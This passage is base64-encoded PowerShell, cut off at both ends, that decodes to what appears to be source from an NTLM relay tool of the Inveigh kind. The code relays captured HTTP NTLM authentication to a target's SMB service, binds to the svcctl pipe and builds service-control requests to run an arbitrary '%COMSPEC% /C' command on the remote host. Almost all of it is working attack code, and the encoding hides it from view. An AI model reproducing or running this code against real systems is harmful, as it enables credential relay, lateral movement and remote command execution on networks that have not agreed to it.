ZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEKICAgICAgICB9CgogICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCgogICAgICAgIGlmKCgkU01CX3ZlcnNpb24gLWVxICdTTUIxJyAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVs5Li4xMl0pIC1lcSAnMDAtMDAtMDAtMDAnKSAtb3IgKCRTTUJfdmVyc2lvbiAtbmUgJ1NNQjEnIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEyLi4xNV0pIC1lcSAnMDAtMDAtMDAtMDAnKSkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBzdWNjZXNzZnVsIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gc3VjY2Vzc2Z1bCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFRhcmdldCIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gc3VjY2Vzc2Z1bCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFRhcmdldCIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIGZhaWxlZCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFRhcmdldCIpCiAgICAgICAgICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0LkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgJFRhcmdldCIpCiAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQoKICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBmYWlsZWQgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRUYXJnZXQiKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIGZhaWxlZCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFRhcmdldCIpCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBpZighJFNNQl9yZWxheV9mYWlsZWQpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoISRTZXJ2aWNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfcmFuZG9tID0gW1N0cmluZ106OkpvaW4oIjAwLSIsKDEuLjIwIHwgRm9yRWFjaC1PYmplY3R7InswOlgyfS0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDY1IC1NYXhpbXVtIDkwKX0pKQogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlX3JhbmRvbSAtcmVwbGFjZSAiLTAwIiwiIgogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlN1YnN0cmluZygwLCRTTUJfc2VydmljZS5MZW5ndGggLSAxKQogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICRTTUJfc2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJFNNQl9zZXJ2aWNlLDAsJFNNQl9zZXJ2aWNlLkxlbmd0aCkKICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9yYW5kb20gKz0gJzAwLTAwLTAwLTAwLTAwJwogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzID0gJFNNQl9zZXJ2aWNlX3JhbmRvbS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9ICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2UgPSAkU2VydmljZQogICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkU2VydmljZSkKCiAgICAgICAgICAgICAgICBpZihbQm9vbF0oJFNNQl9zZXJ2aWNlLkxlbmd0aCAlIDIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9ieXRlcyArPSAweDAwLDB4MDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZXMgKz0gMHgwMCwweDAwLDB4MDAsMHgwMAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3NlcnZpY2VfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NlcnZpY2UuTGVuZ3RoICsgMSkKICAgICAgICAgICAgJENvbW1hbmQgPSAiJUNPTVNQRUMlIC9DIGAiIiArICRDb21tYW5kICsgImAiIgogICAgICAgICAgICBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRDb21tYW5kKSB8IEZvckVhY2gtT2JqZWN0eyRQc0V4ZWNfY29tbWFuZCArPSAiezA6WDJ9LTAwLSIgLWYgJF99CgogICAgICAgICAgICBpZihbQm9vbF0oJENvbW1hbmQuTGVuZ3RoICUgMikpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQc0V4ZWNfY29tbWFuZCArPSAnMDAtMDAnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHNFeGVjX2NvbW1hbmQgKz0gJzAwLTAwLTAwLTAwJwogICAgICAgICAgICB9ICAgIAogICAgICAgIAogICAgICAgICAgICAkUHNFeGVjX2NvbW1hbmRfYnl0ZXMgPSAkUHNFeGVjX2NvbW1hbmQuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfSAgCiAgICAgICAgICAgICRQc0V4ZWNfY29tbWFuZF9sZW5ndGhfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRQc0V4ZWNfY29tbWFuZF9ieXRlcy5MZW5ndGggLyAyKQoKICAgICAgICAgICAgJFNNQl9wYXRoID0gIlxcIiArICRUYXJnZXQgKyAiXElQQyQiCgogICAgICAgICAgICBpZigkU01CX3ZlcnNpb24gLWVxICdTTUIxJykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9wYXRoX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkU01CX3BhdGgpICsgMHgwMAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9wYXRoX2J5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkU01CX3BhdGgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9VVUlEID0gMHg4MSwweGJiLDB4N2EsMHgzNiwweDQ0LDB4OTgsMHhmMSwweDM1LDB4YWQsMHgzMiwweDk4LDB4ZjAsMHgzOCwweDAwLDB4MTAsMHgwMwogICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgICAgICAkU01CX3NwbGl0X2luZGV4ID0gNDI1NgoKICAgICAgICAgICAgaWYoJFNNQl92ZXJzaW9uIC1lcSAnU01CMScpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1RyZWVDb25uZWN0QW5kWFJlcXVlc3QnCgogICAgICAgICAgICAgICAgOlNNQl9leGVjdXRlX2xvb3Agd2hpbGUgKCRTTUJfY2xpZW50X3N0YWdlIC1uZSAnRXhpdCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJFNNQl9jbGllbnRfc3RhZ2UpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJ1RyZWVDb25uZWN0QW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHg3NSAweDE4IDB4MDEsMHg0OCAweGZmLDB4ZmYgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQlRyZWVDb25uZWN0QW5kWFJlcXVlc3QgJFNNQl9wYXRoX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0NyZWF0ZUFuZFhSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlQW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9ieXRlcyA9IDB4NWMsMHg3MywweDc2LDB4NjMsMHg2MywweDc0LDB4NmMsMHgwMCAjIFxzdmNjdGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdHJlZV9JRCA9ICRTTUJfY2xpZW50X3JlY2VpdmVbMjgsMjldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4YTIgMHgxOCAweDAyLDB4MjggJFNNQl90cmVlX0lEICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0ICRTTUJfbmFtZWRfcGlwZV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSUENCaW5kJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJ1JQQ0JpbmQnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfRklEID0gJFNNQl9jbGllbnRfcmVjZWl2ZVs0Miw0M10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgyZiAweDE4IDB4MDUsMHgyOCAkU01CX3RyZWVfSUQgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ0JpbmQgMSAweGI4LDB4MTAgMHgwMSAweDAwLDB4MDAgJFNNQl9uYW1lZF9waXBlX1VVSUQgMHgwMiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNNQl9GSUQgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX0xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhICsgJFJQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRBbmRYUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnT3BlblNDTWFuYWdlclcnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdSZWFkQW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDE1MAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJlIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CUmVhZEFuZFhSZXF1ZXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhWyJTTUJSZWFkQW5kWFJlcXVlc3RfRklEIl0gPSAkU01CX0ZJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICRTTUJfY2xpZW50X3N0YWdlX25leHQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdPcGVuU0NNYW5hZ2VyVycKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJmIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01PcGVuU0NNYW5hZ2VyVyAkU01CX3NlcnZpY2VfYnl0ZXMgJFNNQl9zZXJ2aWNlX2xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLkxlbmd0aCAwIDAgMHgwMSwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJXcml0ZUFuZFhSZXF1ZXN0ICRTTUJfRklEICgkUlBDX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZEFuZFhSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdDaGVja0FjY2VzcycgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnQ2hlY2tBY2Nlc3MnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEwOC4uMTExXSkgLWVxICcwMC0wMC0wMC0wMCcgLWFuZCB